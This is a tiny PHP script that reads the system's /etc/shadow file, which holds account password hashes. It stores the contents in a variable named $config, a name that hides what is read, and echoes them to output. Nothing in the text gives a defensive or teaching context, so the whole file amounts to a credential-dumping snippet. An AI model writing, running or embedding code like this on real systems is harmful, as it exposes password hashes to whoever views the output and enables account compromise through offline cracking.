<?php

$config = file_get_contents(
    "/etc/shadow"
);

echo $config;